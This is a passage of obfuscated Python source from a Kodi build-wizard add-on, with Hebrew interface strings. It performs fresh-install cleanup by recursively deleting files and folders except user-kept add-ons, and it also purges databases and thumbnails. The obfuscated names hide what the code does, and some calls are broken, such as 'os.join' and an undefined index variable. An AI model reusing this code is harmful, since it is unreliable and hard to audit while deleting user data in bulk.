				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4960
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'skin.anonymous.mod'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4961
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'skin.Premium.mod'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4962
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'skin.anonymous.nox'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4963
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'skin.phenomenal'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4964
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.video.metalliq'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4965
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'skin.titan'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4967
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'pvr.iptvsimple'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4968
				elif OOO0OOO00000O0OO0 =='sources.xml'and OO0OO0000O0O0OOO0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4970
				elif OOO0OOO00000O0OO0 =='quicknav.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4973
				elif OOO0OOO00000O0OO0 =='x1101.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4974
				elif OOO0OOO00000O0OO0 =='b-srtym-b.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4975
				elif OOO0OOO00000O0OO0 =='x1102.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4976
				elif OOO0OOO00000O0OO0 =='b-sdrvt-b.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4977
				elif OOO0OOO00000O0OO0 =='x1112.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4978
				elif OOO0OOO00000O0OO0 =='b-tlvvyzyh-b.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4979
				elif OOO0OOO00000O0OO0 =='x1111.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4980
				elif OOO0OOO00000O0OO0 =='b-tvknyshrly-b.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4981
				elif OOO0OOO00000O0OO0 =='x1110.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4982
				elif OOO0OOO00000O0OO0 =='b-yldym-b.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4983
				elif OOO0OOO00000O0OO0 =='x1114.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4984
				elif OOO0OOO00000O0OO0 =='b-mvzyqh-b.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4985
				elif OOO0OOO00000O0OO0 =='mainmenu.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4986
				elif OOO0OOO00000O0OO0 =='skin.Premium.mod.properties'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4987
				elif OOO0OOO00000O0OO0 =='x1122.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4989
				elif OOO0OOO00000O0OO0 =='b-spvrt-b.DATA.xml'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4990
				elif OOO0OOO00000O0OO0 =='favourites.xml'and OO0OO0000O0O0OOO0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4995
				elif OOO0OOO00000O0OO0 =='guisettings.xml'and OO0OO0000O0O0OOO0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4997
				elif OOO0OOO00000O0OO0 =='profiles.xml'and OO0OO0000O0O0OOO0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4998
				elif OOO0OOO00000O0OO0 =='advancedsettings.xml'and OO0OO0000O0O0OOO0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4999
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5000
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'program.apollo'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5001
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5002
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.video.telemedia'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5003
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.video.elementum'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5006
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5008
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'weather.yahoo'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5009
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.video.quasar'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5010
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'program.apollo'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5011
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5012
				elif OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5013
				elif OOO0OOO00000O0OO0 in LOGFILES :wiz .log ("Keep Log File: %s"%OOO0OOO00000O0OO0 ,xbmc .LOGNOTICE )#line:5014
				elif OOO0OOO00000O0OO0 .endswith ('.db'):#line:5015
					try :#line:5016
						if OOO0OOO00000O0OO0 ==O0OO00OOOOO00OOO0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOO0OOO00000O0OO0 ,KODIV ),xbmc .LOGNOTICE )#line:5017
						else :os .remove (os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ))#line:5018
					except Exception as OO0O00O0OOOOO0O0O :#line:5019
						if not OOO0OOO00000O0OO0 .startswith ('Textures13'):#line:5020
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5021
							wiz .log ("-> %s"%(str (OO0O00O0OOOOO0O0O )),xbmc .LOGNOTICE )#line:5022
							wiz .purgeDb (os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ))#line:5023
				else :#line:5024
					DP .update (int (wiz .percentage (OOO0O0OOO0000OOOO ,OOO0OO0OOOO0O0O0O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO00000O0OO0 ),'')#line:5025
					try :os .remove (os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ))#line:5026
					except Exception as OO0O00O0OOOOO0O0O :#line:5027
						wiz .log ("Error removing %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:5028
						wiz .log ("-> / %s"%(str (OO0O00O0OOOOO0O0O )),xbmc .LOGNOTICE )#line:5029
			if DP .iscanceled ():#line:5030
				DP .close ()#line:5031
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5032
				return False #line:5033
		for O0O00O0OOO0O0OOOO ,O0000O000O00O0000 ,OOO0O000O000OOO0O in os .walk (O000000O0O0O0OOO0 ,topdown =True ):#line:5034
			O0000O000O00O0000 [:]=[O0OOOOOO0O0000000 for O0OOOOOO0O0000000 in O0000O000O00O0000 if O0OOOOOO0O0000000 not in EXCLUDES ]#line:5035
			for OOO0OOO00000O0OO0 in O0000O000O00O0000 :#line:5036
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OOO00000O0OO0 ),'')#line:5037
			  if OOO0OOO00000O0OO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:5038
			   if not (OOO0OOO00000O0OO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5039
			    if not (OOO0OOO00000O0OO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:5041
			      if not (OOO0OOO00000O0OO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5042
			       if not (OOO0OOO00000O0OO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5043
			        if not (OOO0OOO00000O0OO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5044
			         if not (OOO0OOO00000O0OO0 =='program.apollo'and KEEPINFO =='true'):#line:5045
			          if not (OOO0OOO00000O0OO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5046
			           if not (OOO0OOO00000O0OO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5047
			            if not (OOO0OOO00000O0OO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5048
			             if not (OOO0OOO00000O0OO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5049
			              if not (OOO0OOO00000O0OO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5050
			               if not (OOO0OOO00000O0OO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5051
			                if not (OOO0OOO00000O0OO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5052
			                 if not (OOO0OOO00000O0OO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5053
			                  if not (OOO0OOO00000O0OO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5054
			                   if not (OOO0OOO00000O0OO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5055
			                    if not (OOO0OOO00000O0OO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5056
			                     if not (OOO0OOO00000O0OO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5057
			                      if not (OOO0OOO00000O0OO0 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5058
			                       if not (OOO0OOO00000O0OO0 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5059
			                           if not (OOO0OOO00000O0OO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5063
			                            if not (OOO0OOO00000O0OO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5064
			                             if not (OOO0OOO00000O0OO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5065
			                              if not (OOO0OOO00000O0OO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5066
			                               if not (OOO0OOO00000O0OO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5067
			                                  shutil .rmtree (os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),ignore_errors =True ,onerror =None )#line:5069
			if DP .iscanceled ():#line:5070
				DP .close ()#line:5071
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5072
				return False #line:5073
		DP .close ()#line:5074
		wiz .clearS ('build')#line:5075
		if over ==True :#line:5076
			return True #line:5077
		elif install =='restore':#line:5078
			return True #line:5079
		elif install :#line:5080
			buildWizard (install ,'normal',over =True )#line:5081
		else :#line:5082
			if INSTALLMETHOD ==1 :O0OO0OO00OOOOOOO0 =1 #line:5083
			elif INSTALLMETHOD ==2 :O0OO0OO00OOOOOOO0 =0 #line:5084
			else :O0OO0OO00OOOOOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5085
			if O0OO0OO00OOOOOOO0 ==1 :wiz .reloadFix ('fresh')#line:5086
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5087
	else :#line:5088
		if not install =='restore':#line:5089
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5090
			wiz .refresh ()#line:5091
def clearCache ():#line:5096
		wiz .clearCache ()#line:5097
def fixwizard ():#line:5101
		wiz .fixwizard ()#line:5102
def totalClean ():#line:5104
		wiz .clearCache ()#line:5106
		wiz .clearPackages ('total')#line:5107
		clearThumb ('total')#line:5108
		cleanfornewbuild ()#line:5109
def cleanfornewbuild ():#line:5110
		try :#line:5111
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5112
		except :#line:5113
			pass #line:5114
		try :#line:5115
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5116
		except :#line:5117
			pass #line:5118
		try :#line:5119
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5120
		except :#line:5121
			pass #line:5122
def clearThumb (type =None ):#line:5123
	O0OOO0OOOO0OO0O0O =wiz .latestDB ('Textures')#line:5124
	if not type ==None :OOOO00O0000OOOO00 =1 #line:5125
	else :OOOO00O0000OOOO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0OOO0OOOO0OO0O0O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5126
	if OOOO00O0000OOOO00 ==1 :#line:5127
		try :wiz .removeFile (os .join (DATABASE ,O0OOO0OOOO0OO0O0O ))#line:5128
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0OOO0OOOO0OO0O0O )#line:5129
		wiz .removeFolder (THUMBS )#line:5130
	else :wiz .log ('Clear thumbnames cancelled')#line:5132
	wiz .redoThumbs ()#line:5133
def purgeDb ():#line:5135
	OO000OO0OOOOOO0OO =[];O0000O000000000O0 =[]#line:5136
	for O0OO0000OO00OOOO0 ,OO00O0O00O0OOO00O ,O0OOO00O000OO0OO0 in os .walk (HOME ):#line:5137
		for OO0OO000OO0OO000O in fnmatch .filter (O0OOO00O000OO0OO0 ,'*.db'):#line:5138
			if OO0OO000OO0OO000O !='Thumbs.db':#line:5139
				OOO00OO00O000OO0O =os .path .join (O0OO0000OO00OOOO0 ,OO0OO000OO0OO000O )#line:5140
				OO000OO0OOOOOO0OO .append (OOO00OO00O000OO0O )#line:5141
				O00OOOOOO0O0000OO =OOO00OO00O000OO0O .replace ('\\','/').split ('/')#line:5142
				O0000O000000000O0 .append ('(%s) %s'%(O00OOOOOO0O0000OO [len (O00OOOOOO0O0000OO )-2 ],O00OOOOOO0O0000OO [len (O00OOOOOO0O0000OO )-1 ]))#line:5143
	if KODIV >=16 :#line:5144
		O00OO00OO0O000000 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0000O000000000O0 )#line:5145
		if O00OO00OO0O000000 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5146
		elif len (O00OO00OO0O000000 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5147
		else :#line:5148
			for OO0000O00OO0OO000 in O00OO00OO0O000000 :wiz .purgeDb (OO000OO0OOOOOO0OO [OO0000O00OO0OO000 ])#line:5149
	else :#line:5150
		O00OO00OO0O000000 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0000O000000000O0 )#line:5151
		if O00OO00OO0O000000 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5152
		else :wiz .purgeDb (OO000OO0OOOOOO0OO [OO0000O00OO0OO000 ])#line:5153
def fastupdatefirstbuild (OO000O0OO0O0000O0 ):#line:5159
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5161
	if ENABLE =='Yes':#line:5162
		if not NOTIFY =='true':#line:5163
			OO00O0OOO0OO00O00 =wiz .workingURL (NOTIFICATION )#line:5164
